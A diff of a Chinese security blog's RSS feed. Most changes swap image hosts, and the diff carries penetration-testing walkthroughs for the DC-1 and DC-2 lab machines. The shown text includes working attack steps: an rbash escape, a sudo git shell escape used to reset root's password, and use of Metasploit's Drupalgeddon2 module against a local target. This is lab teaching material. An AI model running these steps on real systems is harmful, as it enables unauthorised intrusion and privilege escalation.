+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610151958274.png&#34; alt=&#34;image-20230610151958274&#34; /&gt;&lt;/p&gt;
 &lt;h3 id=&#34;登陆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登陆&#34;&gt;#&lt;/a&gt; 登陆&lt;/h3&gt;
 &lt;p&gt;扫出了很多文件，包括我们正要找的 &lt;code&gt;login&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610152052895.png&#34; alt=&#34;image-20230610152052895&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610152052895.png&#34; alt=&#34;image-20230610152052895&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;将我们刚才爆破出来的账号密码输入进去登陆到后台&lt;/p&gt;
 &lt;p&gt;在 &lt;code&gt;/page&lt;/code&gt;  这里找到了 &lt;code&gt;Flag2&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610152221782.png&#34; alt=&#34;image-20230610152221782&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610152221782.png&#34; alt=&#34;image-20230610152221782&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里提示我们找其他的方式进入，想来想去，之前我们不是还扫出了 ssh 端口吗&lt;/p&gt;
 &lt;p&gt;利用爆破出来的账号登陆试试&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; jerry@192.168.112.131 &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7744&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;打了三遍密码，还以为是我打错了&lt;/p&gt;
@@ -264,40 +264,40 @@
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2lFZWFydGgvYXJ0aWNsZS9kZXRhaWxzLzUyNzAzNTk4&#34;&gt;shell 命令行自动补全&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;compgen &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查看能使用哪些指令&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610153033826.png&#34; alt=&#34;image-20230610153033826&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610153033826.png&#34; alt=&#34;image-20230610153033826&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;看到 &lt;code&gt;vi&lt;/code&gt;  可以用，打开文件试试&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610153113208.png&#34; alt=&#34;image-20230610153113208&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610153113208.png&#34; alt=&#34;image-20230610153113208&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里的大致意思就是要我们切换 jerry 用户&lt;/p&gt;
 &lt;p&gt;但 tom 使用的权限很有限，无法切换 jerry 用户&lt;/p&gt;
 &lt;p&gt;这里我们通过对写入环境变量对 &lt;code&gt;rbash&lt;/code&gt;  进行绕过&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token environment constant&#34;&gt;BASH_CMDS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;/bin/sh&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;a	&lt;span class=&#34;token comment&#34;&gt;# 调用 /bin/sh 命令解释器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;&lt;span class=&#34;token environment constant&#34;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token environment constant&#34;&gt;PATH&lt;/span&gt;:/bin:/sbin:/usr/bin:/usr/sbin	&lt;span class=&#34;token comment&#34;&gt;# 设置环境变量&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此时命令基本上都可以使用了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610155406686.png&#34; alt=&#34;image-20230610155406686&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610155406686.png&#34; alt=&#34;image-20230610155406686&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;此时我们切换 jerry 的账号&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;su&lt;/span&gt; jerry&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610155456954.png&#34; alt=&#34;image-20230610155456954&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;su&lt;/span&gt; jerry&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610155456954.png&#34; alt=&#34;image-20230610155456954&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;找到第四个 &lt;code&gt;Flag4&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;提示我们利用 &lt;code&gt;git&lt;/code&gt;  来提权&lt;/p&gt;
 &lt;h3 id=&#34;提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#提权&#34;&gt;#&lt;/a&gt; 提权&lt;/h3&gt;
 &lt;p&gt;我们查看一下有 root 权限的指令&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610155641125.png&#34; alt=&#34;image-20230610155641125&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610155641125.png&#34; alt=&#34;image-20230610155641125&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;只有 &lt;code&gt;git&lt;/code&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dfRnVfUS9hcnRpY2xlL2RldGFpbHMvMTE2Mjc2MDk2&#34;&gt;git 提权方法&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;git&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--help&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610155845910.png&#34; alt=&#34;image-20230610155845910&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;git&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--help&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610155845910.png&#34; alt=&#34;image-20230610155845910&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里我们将 &lt;code&gt;:&lt;/code&gt;  变成 &lt;code&gt;!&lt;/code&gt;  然后输入 shell，这里我们将 root 的密码更改掉&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610155947153.png&#34; alt=&#34;image-20230610155947153&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610155947153.png&#34; alt=&#34;image-20230610155947153&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这样就更改成功了&lt;/p&gt;
 &lt;p&gt;随后切换到 root 用户 在 /root 下找到最终的 Flag&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610160133168.png&#34; alt=&#34;image-20230610160133168&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610160133168.png&#34; alt=&#34;image-20230610160133168&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;至此本章结束&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/DC-1%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/DC-1%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
             <title>DC-1 渗透测试</title>
-            <link>http://k1nako.github.io/DC-1%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
-            <category term="靶场" scheme="http://k1nako.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
-            <category term="靶场复现" scheme="http://k1nako.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
+            <link>http://k1nakoo.github.io/DC-1%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+            <category term="靶场" scheme="http://k1nakoo.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
+            <category term="靶场复现" scheme="http://k1nakoo.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
             <pubDate>Wed, 07 Jun 2023 21:32:23 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;DC 靶场系列&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -314,11 +314,11 @@
 &lt;/ul&gt;
 &lt;h3 id=&#34;安装过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装过程&#34;&gt;#&lt;/a&gt; 安装过程&lt;/h3&gt;
 &lt;p&gt;解压得到 DC-1.ova 文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606211804839.png&#34; alt=&#34;image-20230606211804839&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606211804839.png&#34; alt=&#34;image-20230606211804839&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;用 vmware 虚拟机打开此文件&lt;/p&gt;
 &lt;p&gt;如提示导入失败，点击重试即可&lt;/p&gt;
 &lt;p&gt;kali 和靶机得网络连接模式都改为 NAT 模式，不然 kali 扫不出靶机的 ip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606211955678.png&#34; alt=&#34;image-20230606211955678&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606211955678.png&#34; alt=&#34;image-20230606211955678&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;二-渗透过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-渗透过程&#34;&gt;#&lt;/a&gt; 二、渗透过程&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;攻击机 (kali) ip&lt;/strong&gt;：192.168.16.129&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;靶机 (DC-1) ip&lt;/strong&gt;：192.168.16.131&lt;/p&gt;
@@ -326,17 +326,17 @@
 &lt;h4 id=&#34;探测目标ip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测目标ip&#34;&gt;#&lt;/a&gt; 探测目标 ip&lt;/h4&gt;
 &lt;p&gt;kali 里面有很多探测目标 ip 的工具，例如本文要讲的 arp-scan、netdiscover、nmap&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;arp-scan&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606212548326.png&#34; alt=&#34;image-20230606212548326&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606212548326.png&#34; alt=&#34;image-20230606212548326&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以很明显的看到一个可疑的 &lt;code&gt;.131&lt;/code&gt;  ip 很可能就是我们的靶机，&lt;/p&gt;
 &lt;p&gt;我们可以查看靶机的 mac 地址，与我们探测出来的 mac 地址一样&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606213337360.png&#34; alt=&#34;image-20230606213337360&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606213337360.png&#34; alt=&#34;image-20230606213337360&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;netdiscover&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netdiscover&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606213455640.png&#34; alt=&#34;image-20230606213455640&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netdiscover&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606213455640.png&#34; alt=&#34;image-20230606213455640&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;nmap&lt;/strong&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.16.0/24&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
 &lt;p&gt;ip 后面改为 0/24，是因为这里的 192.168.16.0/24 表示的是这个网段的 ip 地址从 192.168.16.1 开始，到 192.168.16.254 结束（192.168.16.0 和 192.168.16.255 有特殊含义不能当做 ip 地址），子网掩码为 255.255.255.0&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606213635960.png&#34; alt=&#34;image-20230606213635960&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606213635960.png&#34; alt=&#34;image-20230606213635960&#34; /&gt;&lt;/p&gt;
 &lt;h4 id=&#34;探测目标端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测目标端口&#34;&gt;#&lt;/a&gt; 探测目标端口&lt;/h4&gt;
 &lt;p&gt;用 &lt;code&gt;nmap&lt;/code&gt;  来检测&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.16.131 -p- &lt;span class=&#34;token parameter variable&#34;&gt;--open&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
@@ -344,7 +344,7 @@
 &lt;p&gt;-p- 扫描所有端口 0-65535&lt;/p&gt;
 &lt;p&gt;--open 只显示已开启的端口&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606215724755.png&#34; alt=&#34;image-20230606215724755&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606215724755.png&#34; alt=&#34;image-20230606215724755&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;我们的突破口在 &lt;code&gt;22&lt;/code&gt;   &lt;code&gt;80&lt;/code&gt;  ，因为  &lt;code&gt;80&lt;/code&gt;  是 http 协议，所以我们用浏览器打开&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;如不能打开，更改 C:\Windows\System32\drivers\etc\hosts 文件&lt;/p&gt;
@@ -352,9 +352,9 @@
 &lt;/blockquote&gt;
 &lt;h4 id=&#34;网页信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网页信息收集&#34;&gt;#&lt;/a&gt; 网页信息收集&lt;/h4&gt;
 &lt;p&gt;利用插件 &lt;code&gt;wappalyzer&lt;/code&gt;  ，可以看到很多网页的信息，看到了眼熟的 CMS  &lt;code&gt;Drupal&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606220335906.png&#34; alt=&#34;image-20230606220335906&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606220335906.png&#34; alt=&#34;image-20230606220335906&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;也可以用 kali 的工具  &lt;code&gt;whatweb&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whatweb &lt;span class=&#34;token parameter variable&#34;&gt;-v&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.16.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606220703745.png&#34; alt=&#34;image-20230606220703745&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whatweb &lt;span class=&#34;token parameter variable&#34;&gt;-v&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.16.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606220703745.png&#34; alt=&#34;image-20230606220703745&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;我们可以得到以下信息&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;CMS 是 Drupal&lt;/p&gt;
@@ -365,16 +365,16 @@
 &lt;h4 id=&#34;漏洞查找&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞查找&#34;&gt;#&lt;/a&gt; 漏洞查找&lt;/h4&gt;
 &lt;p&gt;都已经知道 cms 是 drupal&lt;/p&gt;
 &lt;p&gt;网上一搜全是漏洞复现的文章&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606221147493.png&#34; alt=&#34;image-20230606221147493&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606221147493.png&#34; alt=&#34;image-20230606221147493&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;也可以用 kali 里的 &lt;code&gt;Metasploit&lt;/code&gt;  查找 drupal 漏洞&lt;/p&gt;
 &lt;p&gt;首先  &lt;code&gt;msfconsole&lt;/code&gt;  启动该工具&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; search drupal&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606221442099.png&#34; alt=&#34;image-20230606221442099&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; search drupal&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606221442099.png&#34; alt=&#34;image-20230606221442099&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以看到有很多的框架漏洞，这里我们使用等级较高的，日期 18 年&lt;/p&gt;
 &lt;h4 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h4&gt;
 &lt;p&gt;使用 18 年那个漏洞&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; use exploit/unix/webapp/drupal_drupalgeddon2 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;或&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; use &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;show options&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查看漏洞模块参数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606222236211.png&#34; alt=&#34;image-20230606222236211&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606222236211.png&#34; alt=&#34;image-20230606222236211&#34; /&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Current Setting : 这里是要配置的内容&lt;/p&gt;
 &lt;p&gt;Required : yes 是必须要配置的，no 是可配可不配&lt;/p&gt;
@@ -385,60 +385,60 @@
 &lt;p&gt;RHOSTS 靶机 ip&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; RHOSTS &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.16.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;配置完直接运行即可&lt;/p&gt;
